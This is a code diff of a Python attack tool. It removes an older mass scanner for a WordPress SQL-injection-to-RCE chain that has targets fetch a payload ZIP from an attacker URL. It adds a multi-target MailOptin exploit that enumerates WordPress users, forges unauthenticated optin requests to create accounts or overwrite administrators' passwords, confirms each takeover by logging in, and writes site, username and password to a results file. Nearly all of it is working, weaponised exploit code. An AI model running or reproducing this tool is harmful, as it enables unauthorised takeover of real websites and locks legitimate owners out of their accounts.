+        if isinstance(data, list) and data and isinstance(data[0], dict):
+            uid = data[0].get("id")
+            if isinstance(uid, int):
+                return uid, slug
+        return None
 
-Interactive (recommended, just run it):
-  python poc_sqli_wpms_general.py
-      -> asks for your sites-list .txt path, the payload ZIP URL, the per-host
-         concurrency (threads) AND how many hosts to scan in parallel (--workers)
-         in one clean prompt sequence,
-      -> scans hosts in parallel and appends each CONFIRMED victim to vuln.txt
-         immediately.
-Non-interactive:
-  python poc_sqli_wpms_general.py --sites list.txt --url-zip https://attacker/h.zip --workers 4 --threads 4
-  python poc_sqli_wpms_general.py --target https://victim.example --url-zip https://attacker/h.zip
-  python poc_sqli_wpms_general.py --sites list.txt --no-fire   # extract-only: nothing appended
-
-Speed: probes are packed ~12-per-HTTP-request (the core 'at most N items' cap is
-auto-learned) and frames run concurrently per host. MANY HOSTS ARE SCANNED IN
-PARALLEL by default (--workers, default 2): with a scan list the wall clock is
-~one host's runtime, not the sum, and long lists keep their strong throughput
-instead of degrading over time. When aiohttp is installed (default 'auto'),
-requests within each extraction round share connections and run through asyncio
-with a --threads' semaphore; without it, or with --no-aiohttp, the same traffic
-runs over urllib threads. Either way a 128-char token is ~100 HTTP requests
-total. Rich colors/tables/progress are used when 'rich' is installed (--plain
-forces plain text; concurrent hosts each get their own live progress line).
-"""
-
-import argparse
-import os
-import sys
+    for uid, slug in await asyncio.gather(*(one(s) for s in slugs)):
+        _store(found, uid, slug, "slug")
+    return found
 
 
+async def discover_via_sitemap(client: Client, threads: int
+                               ) -> Dict[int, UserRec]:
+    """wp-sitemap-users-1.xml lists one author archive per user."""
+    for path in ("/wp-sitemap-users-1.xml", "/wp-sitemap.xml"):
+        try:
+            resp = await client.get_follow(path)
+        except Exception:
+            continue
+        slugs: List[str] = []
+        for match in SITEMAP_LOC_RE.finditer(resp.text or ""):
+            slug = urllib.parse.unquote(match.group(2) or "").strip()
+            if slug and slug not in slugs:
+                slugs.append(slug)
+        if slugs:
+            found = await resolve_slugs(client, slugs, threads)
+            for uid in list(found):
+                found[uid].add_name(None, "sitemap")
+            return found
+    return {}
 
-def main():
-    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
-    ap.add_argument("--target", help="single WordPress root URL (prompted when omitted)")
-    ap.add_argument("--sites", "-s", dest="sites", default=None,
-                    help="path to a .txt list of WordPress roots (one per line)")
-    ap.add_argument("--vuln-out", "-o", default="vuln.txt",
-                    help="file confirmed victims are appended to as soon as each is proven")
-    ap.add_argument("--url-zip", "--file-url", dest="url_zip", default=None,
-                    help="payload ZIP each target's connect_process will download")
-    ap.add_argument("--plugin-slug", default="evilprobe",
-                    help="plugin folder/main-file token to confirm in active_plugins post-fire")
-    ap.add_argument("--dialect", choices=("auto", "sqlite", "mysql"), default="auto")
-    ap.add_argument("--prefix", default=None, help="options table prefix (auto-detected by default)")
-    ap.add_argument("--length", type=int, default=None, help="option value length (auto-detected)")
-    ap.add_argument("--threads", type=int, default=None,
-                    help="concurrent batch requests per host (default 2; prompted when omitted)")
-    ap.add_argument("--workers", type=int, default=None,
-                    help="how many hosts are scanned in parallel (default 2; prompted when omitted)")
-    ap.add_argument("--timeout", type=float, default=60.0, help="per-request timeout, seconds")
-    ap.add_argument("--retries", type=int, default=2)
-    ap.add_argument("--no-fire", action="store_true")
-    ap.add_argument("--no-aiohttp", action="store_true", help="force the urllib+threads transport")
-    ap.add_argument("--plain", action="store_true", help="plain text output, no rich colors")
+
+async def probe_author(client: Client, uid: int) -> Optional[Tuple[int, str]]:
+    """
+    ?author=N answers 404 for an id that does not exist, but a 200 proves
+    nothing on its own - the canonical redirect can land on the home page. An id
+    only counts when the final path is an /author/... path as well.
+    """
+    try:
+        resp = await client.get_follow("/?author=%d" % uid)
+    except Exception:
+        return None
+    if resp.status != 200:
+        return None
+    match = AUTHOR_RE.search(resp.final or "")
+    if not match:
+        return None
+    return uid, urllib.parse.unquote(match.group(1))
+
+
+async def discover_via_authors(client: Client, max_users: int,
+                               threads: int) -> Dict[int, UserRec]:
+    """Blind id sweep - the only channel that finds users with no published post."""
+    found: Dict[int, UserRec] = {}
+    sem = asyncio.Semaphore(max(1, threads))
+
+    async def one(uid: int):
+        async with sem:
+            return await probe_author(client, uid)
+
+    for uid, slug in filter(None, await asyncio.gather(
+            *(one(i) for i in range(1, max_users + 1)))):
+        _store(found, uid, slug, "author")
+    return found
+
+
+async def discover_users(client: Client, max_users: int,
+                         threads: int) -> Tuple[Dict[int, UserRec], Dict[str, int]]:
+    """
+    All four channels. REST and the sitemap run together; the author sweep is
+    blind and slower, so it starts at the same time and everything is merged at
+    the end. Nothing is read from disk.
+    """
+    merged: Dict[int, UserRec] = {}
+
+    def absorb(source_map: Dict[int, UserRec], source: str) -> None:
+        for uid, rec in source_map.items():
+            target = merged.setdefault(uid, UserRec(uid))
+            for name in rec.names:
+                target.add_name(name, source)
+
+    rest_task = asyncio.ensure_future(discover_via_rest(client))
+    sitemap_task = asyncio.ensure_future(discover_via_sitemap(client, threads))
+    author_task = asyncio.ensure_future(
+        discover_via_authors(client, max_users, threads))
+    try:
+        rest, sitemap, authors = await asyncio.gather(rest_task, sitemap_task,
+                                                      author_task)
+    finally:
+        for task in (rest_task, sitemap_task, author_task):
+            if not task.done():
+                task.cancel()
+
+    absorb(rest, "rest")
+    absorb(sitemap, "sitemap")
+    absorb(authors, "author")
+    return merged, {"rest": len(rest), "sitemap": len(sitemap),
+                    "author": len(authors), "total": len(merged)}
+
+
+# =============================================================================
+# the exploit
+# =============================================================================
+
+def ajax_path() -> str:
+    return "/?" + urllib.parse.urlencode({"mailoptin-ajax": AJAX_ACTION})
+
+
+def build_fields(target: Target, campaign_id: int, email: str,
+                 mappings: Dict[str, str], values: Dict[str, Any],
+                 role: Optional[str]) -> List[Tuple[str, Any]]:
+    fields: List[Tuple[str, Any]] = [
+        ("optin_data[optin_uuid]", random_token()),
+        # AjaxHandler.php:705 - an explicit id wins outright, is never validated
+        # against the uuid, and is_activated() is never consulted.
+        ("optin_data[optin_campaign_id]", campaign_id),
+        ("optin_data[email]", email),
+        ("optin_data[name]", "poc"),
+        ("optin_data[user_agent]", UA),
+        ("optin_data[conversion_page]", target.base + "/"),
+        ("optin_data[referrer]", target.base + "/"),
+        # AjaxHandler.php:770-781 rejects submissions younger than ~1.5s.
+        ("optin_data[_mo_timestamp]", int(time.time()) - 5),
+    ]
+    for wp_field, payload_key in mappings.items():
+        fields.append(("optin_data[form_custom_field_mappings][%s]" % wp_field,
+                       payload_key))
+    for key, value in values.items():
+        fields.append(("optin_data[%s]" % key, value))
+    if role:
+        fields.append(("optin_data[mo-list-subscription-integration]", WPCONN))
+        fields.append(("optin_data[mo-list-subscription]", role))
+    return fields
+
+
+def accepted(parsed: Any) -> bool:
+    """
+    A write implies the connection ran, which implies success:true, so this is
+    a safe pre-filter: it never discards a real hit, it only avoids spending
+    login requests on campaigns that never connected. A lead_bank_only campaign
+    also answers true - which is exactly why stage 2 still proves the login.
+    """
+    return isinstance(parsed, dict) and parsed.get("success") is True
+
+
+def landed_in_admin(prefix: str, final_path: str) -> bool:
+    """
+    An unauthenticated GET of /wp-admin/... is answered with a redirect to
+    wp-login.php, which then returns 200. Only the final path separates a real
+    session from the login form, so the status code alone is never enough.
+    """
+    path = urllib.parse.urlsplit(final_path or "").path or "/"
+    if path.startswith(prefix + "/wp-admin/") or path.startswith("/wp-admin/"):
+        return "wp-login.php" not in path
+    return False
+
+
+async def send_optin(client: Client, campaign_id: int, email: str,
+                     mappings: Dict[str, str], values: Dict[str, Any],
+                     role: Optional[str]) -> Tuple[Optional[Any], int]:
+    """One anonymous POST. Returns (parsed_json, http_status)."""
+    fields = build_fields(client.t, campaign_id, email, mappings, values, role)
+    try:
+        resp = await client.post(ajax_path(), fields,
+                                 referer=client.t.base + "/")
+    except Exception:
+        return None, 0
+    return parse_json_loose(resp.text), resp.status
+
+
+def stage_one_fields(mode: str, user_id: Optional[int], new_login: str,
+                     secret: str) -> Tuple[Dict[str, str], Dict[str, Any],
+                                           Optional[str]]:
+    """
+    CREATE    user_login + user_pass, no ID, role 'editor'. Asking for
+              'administrator' on the create path only adds a request, because
+              Subscription.php:62 overwrites it with the new account's own role.
+    TAKEOVER  ID + user_pass, role 'administrator' - required, because on the
+              update path Subscription.php:62 substitutes the victim's CURRENT
+              role, the key is dropped by array_filter() and the real role stays.
+              Without an integration+role pair the connection never runs.
+    """
+    if mode == "CREATE" or user_id is None:
+        return ({"user_login": "poc_login", "user_pass": "poc_pass"},
+                {"poc_login": new_login, "poc_pass": secret}, "editor")
+    return ({"ID": "poc_id", "user_pass": "poc_pass"},
+            {"poc_id": user_id, "poc_pass": secret}, "administrator")
+
+
+async def classify_session(client: Client) -> str:
+    """One request splits the three outcomes. See ADMIN_PROBE."""
+    try:
+        resp = await client.get_follow(ADMIN_PROBE)
+    except Exception:
+        return ANON
+    if not landed_in_admin(client.t.prefix, resp.final):
+        return ANON
+    return ADMIN if resp.status == 200 else MEMBER
+
+
+async def read_profile(client: Client) -> Profile:
+    """
+    Read the authoritative identity of whoever is logged in.
+
+    A takeover rewrites user_pass (and user_email) but never touches user_login,
+    so profile.php is where the real victim name comes from - it is the value
+    worth writing to the results file. Each field is matched in more than one
+    attribute order because the markup moves between WordPress versions.
+    """
+    try:
+        resp = await client.get_follow(PROFILE_PATH)
+    except Exception:
+        return Profile()
+    if resp.status != 200 or not landed_in_admin(client.t.prefix, resp.final):
+        return Profile()
+    text = resp.text or ""
+
+    login = (RE_USER_LOGIN.search(text) or RE_USER_LOGIN_ALT.search(text)
+             or RE_USER_LOGIN_NAME.search(text)
+             or RE_USER_LOGIN_NAME_ALT.search(text))
+    email = RE_EMAIL.search(text)
+    nick = RE_NICKNAME.search(text)
+    uid = RE_USER_ID.search(text)
+
+    user_id = None
+    if uid:
+        try:
+            user_id = int(uid.group(1))
+        except ValueError:
+            user_id = None
+    return Profile(login.group(1) if login else None,
+                   email.group(1) if email else None,
+                   nick.group(1) if nick else None,
+                   user_id)
+
+
+async def read_admin_user_logins(client: Client, wanted: Optional[int] = None,
+                                 max_pages: int = 3
+                                 ) -> Dict[int, str]:
+    """
+    user id -> real user_login, read from wp-admin/users.php.
+
+    profile.php only ever describes the account whose session is live.
+    users.php lists every account with its actual user_login, which is what
+    turns a bare id into a usable username - and it is reachable precisely
+    because the takeover already produced an administrator session. Pages are
+    walked only until the wanted id shows up.
+    """
+    mapping: Dict[int, str] = {}
+    for page in range(1, max_pages + 1):
+        path = (ADMIN_USERS_PATH if page == 1
+                else "%s?paged=%d" % (ADMIN_USERS_PATH, page))
+        try:
+            resp = await client.get_follow(path)
+        except Exception:
+            break
+        if resp.status != 200 or not landed_in_admin(client.t.prefix,
+                                                      resp.final):
+            break
+        rows = USERS_ROW_RE.findall(resp.text or "")
+        if not rows:
+            break
+        for raw_uid, row in rows:
+            try:
+                uid = int(raw_uid)
+            except ValueError:
+                continue
+            for pattern in USERS_NAME_RES:
+                found = pattern.search(row)
+                if found and found.group(1).strip():
+                    mapping[uid] = html_lib.unescape(found.group(1)).strip()
+                    break
+        if wanted is not None and wanted in mapping:
+            break
+        if len(rows) < ADMIN_USERS_PER_PAGE:
+            break
+    return mapping
+
+
+async def resolve_username(client: Client, profile: Profile, uid: Optional[int],
+                           by_uid: Dict[int, UserRec], identifier: str
+                           ) -> Tuple[Optional[str], str]:
+    """
+    The real user_login, most authoritative source first.
+
+    1. profile.php - what the live session says it is. Exact by definition.
+    2. users.php   - the admin account list, exact for any id.
+    3. /author/    - the nicename. Usually equals the login, but WordPress
+       sanitises it, so "john.doe" is published as "johndoe". It is returned
+       last and always labelled, because a wrong username is worse than none.
+
+    Returns (username, source); username is None when nothing authoritative
+    answered, and the caller must not invent one.
+    """
+    if profile.user_login:
+        return profile.user_login, "profile.php"
+    if uid is not None:
+        admin_names = await read_admin_user_logins(client, uid)
+        if uid in admin_names:
+            return admin_names[uid], "users.php"
+        rec = by_uid.get(uid)
+        if rec is not None and rec.names:
+            return rec.label, "author-slug (unverified)"
+    return None, ""
+
+
+async def login_and_classify(client: Client, identifier: str,
+                             password: str) -> str:
+    try:
+        await client.post(LOGIN_PATH,
+                          {"log": identifier, "pwd": password,
+                           "wp-submit": "Log In", "testcookie": "1",
+                           "redirect_to": client.t.base + "/wp-admin/"},
+                          referer=client.t.base + LOGIN_PATH)
+    except Exception:
+        return ANON
+    return await classify_session(client)
+
+
+# =============================================================================
+# interactive prompts
+# =============================================================================
+
+def ask(prompt: str, default: str, cast=str, assume: bool = False) -> Any:
+    """Prompt with a default. The default is cast too, so a non-interactive
+    stdin (EOFError) still yields the declared type, not a raw string.
+    assume=True is --yes: take the default without reading stdin."""
+    def coerce(raw: str) -> Any:
+        if not raw:
+            return cast(default)
+        try:
+            return cast(raw)
+        except (TypeError, ValueError):
+            print("  ! %r is not valid here, using %r" % (raw, default))
+            return cast(default)
+    if assume:
+        return coerce("")
+    try:
+        return coerce(input(prompt).strip())
+    except (EOFError, KeyboardInterrupt):
+        print()
+        return cast(default)
+
+
+def ask_target_list(explicit: Optional[str],
+                    assume: bool = False) -> Tuple[Optional[str], List[str]]:
+    """Asks where the list of TARGET SITES is. '-' switches to --url mode."""
+    here = os.path.dirname(os.path.abspath(__file__))
+    guesses = [os.path.join(here, "sites.txt"),
+               os.path.join(os.getcwd(), "sites.txt"),
+               os.path.join(os.getcwd(), "targets.txt"),
+               os.path.join(os.getcwd(), "urls.txt")]
+    suggestion = explicit or next((g for g in guesses if os.path.isfile(g)),
+                                  guesses[0])
+    answer = ask("list of target URLs [%s] ('-' for one url): " % suggestion,
+                 suggestion, assume=assume)
+    if answer.lower() in ("-", "skip", "none", "no"):
+        return None, []
+    if not os.path.isfile(answer):
+        print("  ! %s not found" % answer)
+        return answer, []
+    lines = []
+    # utf-8-sig, not utf-8: a list saved by PowerShell 5.1 or Notepad starts with
+    # a BOM, and an unstripped U+FEFF turns "127.0.0.1" into a host that resolves
+    # nowhere.
+    with open(answer, "r", encoding="utf-8-sig", errors="replace") as fh:
+        for raw in fh:
+            line = raw.strip().lstrip("\ufeff").strip()
+            if line and not line.startswith("#") and not line.startswith("//"):
+                lines.append(line)
+    return answer, lines
+
+
+# =============================================================================
+# rich helpers
+# =============================================================================
+
+def make_console() -> Optional["Console"]:
+    return Console(highlight=False) if RICH else None
+
+
+def say(console: Optional["Console"], message: str = "") -> None:
+    if console:
+        console.print(message)
+    else:
+        print(re.sub(r"\[/?[a-z ]+\]", "", message))
+
+
+def hits_table(console: Optional["Console"], hits: List[Hit]) -> None:
+    if not console:
+        for hit in hits:
+            print("  " + hit.line)
+        return
+    table = Table(box=box.ROUNDED, border_style="green", show_lines=True,
+                  title="confirmed accounts", title_style="bold green")
+    table.add_column("results-file line", style="bold white", overflow="fold")
+    table.add_column("mode", style="cyan")
+    table.add_column("cid", justify="right", style="magenta")
+    table.add_column("uid", justify="right", style="magenta")
+    table.add_column("access", style="bold")
+    for hit in hits:
+        table.add_row(hit.line, hit.mode, str(hit.campaign_id),
+                      str(hit.user_id if hit.user_id is not None else "-"),
+                      "[bold green]ADMIN[/]" if hit.administrator
+                      else "[yellow]member[/]")
+    console.print(table)
+
+
+# =============================================================================
+# per-target work
+# =============================================================================
+
+async def run_site(target: Target, args, threads: int, log: VulnLog,
+                   console: Optional["Console"], memory: CampaignMemory,
+                   secret: str, password: str, emails: Dict[str, str],
+                   login_for: str) -> SiteResult:
+    """
+    Everything for one target. Discovery is concurrent, the attack sweep is
+    batched, and verification is sequential so the cookie jar stays coherent.
+    """
+    result = SiteResult(target)
+    inner = max(2, min(threads, 8))          # per-target request concurrency
+    try:
+        async with Client(target, timeout=args.timeout,
+                          insecure=args.insecure) as client:
+            # No "is this WordPress" gate - the first request is discovery.
+            users, counts = await discover_users(client, args.max_users, inner)
+            result.counts = counts
+            result.users = [users[uid] for uid in sorted(users)]
+            by_uid = {u.uid: u for u in result.users}
+
+            if not users and args.mode == "takeover":
+                # Only takeover needs a victim: CREATE just needs a campaign
+                # id, so a site whose users cannot be enumerated is still
+                # worth a create attempt instead of being written off.
+                result.note = "no users found"
+                result.requests = client.requests
+                return result
+
+            order = [u.uid for u in result.users]
+            campaigns = memory.ordered(args.max_campaigns)
+            pairs: List[Tuple[int, Optional[int]]] = []
+            # TAKEOVER first: it is the only path that can yield an
+            # administrator. CREATE is capped at the site default role, so it is
+            # never allowed to end the scan before takeover has been tried.
+            if args.mode in ("takeover", "both"):
+                pairs.extend((cid, uid) for cid in campaigns for uid in order)
+            if args.mode in ("create", "both"):
+                pairs.extend((cid, None) for cid in campaigns)
+
+            if args.dry_run:
+                result.note = "dry run, %d candidate(s) planned" % len(pairs)
+                result.requests = client.requests
+                return result
+
+            sem = asyncio.Semaphore(inner)
+            stop = asyncio.Event()
+            taken: set = set()            # user ids already rewritten
+            created = False              # a CREATE login is now taken
+            dead_replies = 0
+
+            async def stage_one(pair):
+                """The only write. One optin POST, reply judged immediately."""
+                nonlocal dead_replies
+                cid, uid = pair
+                mode = "CREATE" if uid is None else "TAKEOVER"
+                mappings, values, role = stage_one_fields(
+                    mode, uid, login_for, password if uid is None else secret)
+                async with sem:
+                    parsed, status = await send_optin(
+                        client, cid, emails.get(mode, uid), mappings, values,
+                        role)
+                if accepted(parsed):
+                    return pair, mode
+                # Adaptive bail-out: a target without the plugin answers the
+                # same dead way every time, so stop instead of grinding through
+                # the rest of the range.
+                if parsed is None and status in DEAD_STATUS:
+                    dead_replies += 1
+                else:
+                    dead_replies = 0
+                return None
+
+            async def stage_two(pair, mode) -> Optional[Hit]:
+                """
+                Proof. SEQUENTIAL - concurrent logins on one cookie jar log each
+                other out. The username is read back from the account itself
+                after logging in, never guessed from the id that was attacked.
+                """
+                cid, uid = pair
+                address = emails.get(mode, uid)
+                identifier = login_for if mode == "CREATE" else address
+                access = await login_and_classify(client, identifier, password)
+                if access == ANON:
+                    return None
+                profile = await read_profile(client)
+
+                # Identity guard. The session must belong to the account this
+                # pair attacked; if it does not, the credential on record would
+                # be somebody else's, so the hit is discarded rather than
+                # written out with the wrong name.
+                if (uid is not None and profile.user_id is not None
+                        and profile.user_id != uid):
+                    result.note = ("session id %d does not match targeted id %d"
+                                   % (profile.user_id, uid))
+                    return None
+
+                username, source = await resolve_username(
+                    client, profile, uid, by_uid, identifier)
+                if mode == "CREATE" or uid is None:
+                    role_note = "site default (editor)"
+                    if username is None:
+                        username, source = identifier, "created login"
+                else:
+                    role_note = "role preserved"
+                if username is None:
+                    # Nothing authoritative answered. Say so plainly instead of
+                    # inventing a name that would look like a real username.
+                    username, source = "uid-%s" % uid, "UNRESOLVED"
+                    role_note = "role preserved; USERNAME UNRESOLVED"
+
+                return Hit(site=target.base, login_url=target.login_url,
+                           username=username, password=password, mode=mode,
+                           campaign_id=cid, user_id=uid,
+                           email=profile.user_email or address,
+                           access=access,
+                           detail="%s; user via %s" % (role_note, source))
+
+            index = 0
+            while index < len(pairs) and not stop.is_set():
+                if dead_replies >= args.dead_limit:
+                    result.note = ("endpoint not answering after %d replies"
+                                   % dead_replies)
+                    break
+                window = [p for p in pairs[index:index + args.batch]
+                          if not (p[1] is not None and p[1] in taken)
+                          and not (p[1] is None and created)]
+                index += args.batch
+                if not window:
+                    continue
+                survivors = [r for r in await asyncio.gather(
+                    *(stage_one(p) for p in window)) if r]
+                for pair, mode in survivors:
+                    memory.record(pair[0])
+                    hit = await stage_two(pair, mode)
+                    if not hit:
+                        continue
+                    if await log.write(hit, console):
+                        result.hits.append(hit)
+                    # A user that just changed hands is not retried against the
+                    # remaining campaigns, and a created login cannot be created
+                    # twice.
+                    if mode == "CREATE":
+                        created = True
+                    else:
+                        taken.add(pair[1])
+                    # Default: keep going until an administrator appears, because
+                    # a member-level hit is usually not the best one available.
+                    # --all stops at the first hit of any level.
+                    if hit.administrator or args.all:
+                        stop.set()
+
+            if result.hits:
+                result.note = "%d account(s)" % len(result.hits)
+            elif not result.note:
+                result.note = ("nothing written in %d campaign(s)"
+                               % len(campaigns))
+            result.requests = client.requests
+            return result
+    except Exception as exc:                       # noqa: BLE001
+        result.note = "error: %s" % exc
+        return result
+
+
+# =============================================================================
+# main
+# =============================================================================
+
+async def run() -> int:
+    ap = argparse.ArgumentParser(
+        description="MailOptin unauthenticated WordPress takeover, "
+                    "multi-target (single file, aiohttp + rich)")
+    ap.add_argument("--urls", help="file with one target URL per line; "
+                                   "asked for if omitted")
+    ap.add_argument("--url", help="single target, skips the list prompt")
+    ap.add_argument("--threads", type=int,
+                    help="targets scanned at once (asked for if omitted)")
+    ap.add_argument("--out", default="vulns.txt",
+                    help="results file, one line per hit "
+                         "(default: %(default)s)")
+    ap.add_argument("--password", default="", help="password to set")
+    ap.add_argument("--email", default="",
+                    help="e-mail template; {host} and {mode} are replaced")
+    ap.add_argument("--login", default="",
+                    help="new-account name template; {host} is replaced")
+    ap.add_argument("--max-campaigns", type=int, default=40)
+    ap.add_argument("--max-users", type=int, default=40)
+    ap.add_argument("--batch", type=int, default=8,
+                    help="campaigns probed per verification round "
+                         "(default: %(default)s)")
+    ap.add_argument("--dead-limit", type=int, default=8,
+                    help="give up on a target after this many unanswered "
+                         "replies in a row (default: %(default)s)")
+    ap.add_argument("--mode", choices=["create", "takeover", "both"],
+                    default="both")
+    ap.add_argument("--plain-pass", action="store_true",
+                    help="deprecated and ignored: CREATE always sends plaintext, "
+                         "TAKEOVER can only send a phpass hash")
+    ap.add_argument("--all", action="store_true",
+                    help="stop at the first hit of any level, not just admin")
+    ap.add_argument("--timeout", type=float, default=12.0)
+    ap.add_argument("--insecure", action="store_true")
+    ap.add_argument("--yes", action="store_true",
+                    help="accept every default instead of prompting")
+    ap.add_argument("--dry-run", action="store_true",
+                    help="discover users only, write nothing")
     args = ap.parse_args()
 
-    ui = UI(plain=args.plain)
-    ui.banner("GENERAL PoC: WP Core SQLi -> WP Mail SMTP raw token -> RCE",
-              "single self-contained scanner; prompts for sites .txt / zip / threads / workers")
+    console = make_console()
+    say(console)
+    say(console, "[bold red]MailOptin - unauthenticated WordPress takeover[/]")
+    say(console, "[dim]one line per hit in %s[/]" % os.path.abspath(args.out))
+    say(console)
+    if args.plain_pass:
+        say(console, "[yellow]--plain-pass is ignored: CREATE always sends "
+                     "plaintext, TAKEOVER can only send a phpass hash[/]")
 
-    if args.sites:
-        targets = load_targets(args.sites)
-        ui.info("sites list: %s (%d target(s))" % (args.sites, len(targets)))
-    elif args.target:
-        targets = [args.target]
+    # ---- questions -------------------------------------------------------
+    if args.url:
+        list_path, list_lines = None, [args.url]
+    elif args.urls:
+        list_path, list_lines = ask_target_list(args.urls, assume=args.yes)
     else:
-        p = ui.ask_sites() if sys.stdin.isatty() else None
-        if p:
-            targets = load_targets(p)
-            ui.info("sites list: %s (%d target(s))" % (p, len(targets)))
-        else:
-            target = ui.ask("--target", default=None)
-            targets = [target]
+        list_path, list_lines = ask_target_list(None, assume=args.yes)
+    if not list_lines and not args.url:
+        say(console, "[red]no targets loaded[/]")
+        return 2
 
+    threads = args.threads if args.threads else ask("threads [16]: ", "16", int,
+                                                  assume=args.yes)
+    threads = max(1, min(threads, 128))
+
+    # ---- targets ---------------------------------------------------------
+    targets: List[Target] = []
+    seen = set()
+    for line in list_lines:
+        target = parse_target(line)
+        if target is None:
+            continue
+        key = target.base.lower()
+        if key in seen:
+            continue
+        seen.add(key)
+        targets.append(target)
     if not targets:
-        raise CampaignAbort("no targets to scan")
+        say(console, "[red]no valid targets in the list[/]")
+        return 2
 
-    if args.threads is None:
-        args.threads = ui.ask_int("--threads (concurrent requests per host)", default=2)
-    if args.workers is None:
-        args.workers = ui.ask_int("--workers (hosts scanned in parallel)", default=2)
-    if not args.no_fire:
-        args.url_zip = args.url_zip or ui.ask("--url-zip payload URL", default=None)
+    password = args.password or "Pwn3d-MailOptin-2026"
+    # CREATE and TAKEOVER must not share an e-mail: the takeover writes that
+    # address onto an existing account and wp_insert_user() refuses an update
+    # whose e-mail already belongs to somebody else. The random tag also lets
+    # the same target be scanned twice in a row.
+    tag = "%04x" % random.SystemRandom().randrange(0x10000)
+    email_tpl = args.email or "poc_{mode}_{uid}@{host}"
+    login_tpl = args.login or "poc_{host}_%s" % tag
+    # The takeover password travels pre-hashed, and it MUST: the connection
+    # stores user_pass verbatim, so a plaintext here leaves an account whose
+    # password can never be verified by wp_check_password(). CREATE is the
+    # opposite case and always sends plaintext (see the stage_one_fields call).
+    secret = phpass_hash(password)
 
-    transport = "threads" if args.no_aiohttp else "auto"
-    ui.info("transport: %s (aiohttp available=%s)" % (transport, aio_available()))
+    if console:
+        console.print(Panel(
+            "[bold]targets[/]  %d from %s\n"
+            "[bold]threads[/]  %d at a time\n"
+            "[bold]password[/] %s\n"
+            "[bold]results[/]  %s\n\n"
+            "[yellow]This creates or rewrites real WordPress accounts. On an "
+            "existing account the previous password stops working immediately.[/]"
+            % (len(targets), list_path or "command line", threads, password,
+               os.path.abspath(args.out)),
+            box=box.ROUNDED, border_style="yellow"))
 
-    sys.exit(scan_targets(ui, targets, do_fire=not args.no_fire,
-                          url_zip=args.url_zip, dialect=args.dialect, prefix=args.prefix,
-                          length=args.length, timeout=args.timeout, retries=args.retries,
-                          threads=args.threads, workers=args.workers,
-                          plugin_slug=args.plugin_slug,
-                          transport=transport, vuln_out=args.vuln_out))
+    if not phpass_selftest():
+        say(console, "[red]phpass self-test FAILED - refusing to run[/]")
+        return 2
+    say(console, "[green]ok[/] phpass matches WordPress (%d vectors)"
+        % len(PHPASS_VECTORS))
+    say(console, "[dim]no username wordlist - every user is found through "
+                 "WordPress itself[/]")
+
+    log = VulnLog(args.out)
+    await log.header("targets=%d threads=%d mode=%s campaigns=%d"
+                     % (len(targets), threads, args.mode, args.max_campaigns))
+
+    memory = CampaignMemory()
+    queue: asyncio.Queue = asyncio.Queue()
+    for target in targets:
+        queue.put_nowait(target)
+    all_hits: List[Hit] = []
+    wp_found = 0
+    prog = None
+    prog_task = None
+
+    async def worker() -> None:
+        nonlocal wp_found
+        while True:
+            try:
+                target = queue.get_nowait()
+            except asyncio.QueueEmpty:
+                return
+            host = target.host
+            emails = Mailbox(email_tpl.replace("{host}", host))
+            try:
+                result = await run_site(
+                    target, args, threads, log, console, memory, secret,
+                    password, emails, login_tpl.replace("{host}",
+                                                       slugify(host)))
+            except Exception as exc:                  # noqa: BLE001
+                say(console, "  [red]%s error: %s[/]" % (target.base, exc))
+                if prog is not None:
+                    prog.advance(prog_task)
+                continue
+            counts = result.counts or {}
+            if counts.get("total"):
+                wp_found += 1
+            found = "rest %d / sitemap %d / author %d" % (
+                counts.get("rest", 0), counts.get("sitemap", 0),
+                counts.get("author", 0))
+            mark = ("[bold green]HIT [/]" if result.hits else
+                    "[cyan]dry [/]" if args.dry_run else "[dim]--- [/]")
+            say(console, "  %s[bold]%-40s[/] users=%-3d %-30s %s"
+                % (mark, target.base, counts.get("total", 0), found,
+                   result.note))
+            all_hits.extend(result.hits)
+            if prog is not None:
+                prog.advance(prog_task)
+
+    workers = min(threads, len(targets))
+    if console:
+        with Progress(SpinnerColumn(spinner_name=SPINNER),
+                      TextColumn("[cyan]scanning targets"),
+                      BarColumn(), MofNCompleteColumn(),
+                      TimeElapsedColumn(), console=console) as bar:
+            prog = bar
+            prog_task = bar.add_task("targets", total=len(targets))
+            await asyncio.gather(*(worker() for _ in range(workers)))
+    else:
+        await asyncio.gather(*(worker() for _ in range(workers)))
+
+    # ---- verdict ---------------------------------------------------------
+    elapsed = time.time() - STARTED
+    say(console)
+    if all_hits:
+        hits_table(console, all_hits)
+    admins = [h for h in all_hits if h.administrator]
+
+    if console:
+        if admins:
+            body = ("[bold green]VERIFIED[/] unauthenticated administrator "
+                    "access on %d of %d target(s) that answered"
+                    % (len({h.site for h in admins}), wp_found))
+            style = "green"
+        elif args.dry_run:
+            body = ("[cyan]DRY RUN[/] %d target(s) probed, %d answered.\n"
+                    "Users were discovered. Nothing was written - drop "
+                    "--dry-run to attack." % (len(targets), wp_found))
+            style = "cyan"
+        elif all_hits:
+            body = ("[bold yellow]PARTIAL[/] %d account(s) on %d target(s), "
+                    "none administrator.\nNo campaign published "
+                    "'administrator', so Subscription.php:62 replaced the role."
+                    % (len(all_hits), len({h.site for h in all_hits})))
+            style = "yellow"
+        else:
+            body = ("[bold red]nothing worked[/]\n%d of %d target(s) answered. "
+                    "Either no %s campaign exists in the range tried, or every "
+                    "candidate was lead_bank_only and answered success without "
+                    "writing - try a higher --max-campaigns."
+                    % (wp_found, len(targets), WPCONN))
+            style = "red"
+        console.print(Panel(body, box=box.HEAVY, border_style=style))
+        console.print("[dim]%d line(s) in %s  |  %d target(s)  |  %.1fs[/]"
+                      % (log.count, os.path.abspath(args.out), len(targets),
+                         elapsed))
+    else:
+        print("\n%d line(s) in %s  |  %d target(s)  |  %.1fs"
+              % (log.count, os.path.abspath(args.out), len(targets), elapsed))
+
+    if admins:
+        return 0
+    if all_hits:
+        return 7
+    return 5
 
 
 if __name__ == "__main__":
-    sys.exit(main())
+    try:
+        sys.exit(asyncio.run(run()))
+    except KeyboardInterrupt:
+        sys.stderr.write("\ninterrupted - anything already proven is in the "
+                         "results file\n")
+        sys.exit(130)
+    except Exception as exc:                       # noqa: BLE001
+        import traceback
+        traceback.print_exc()
+        sys.stderr.write("[FATAL] %s\n" % exc)
+        sys.exit(1)
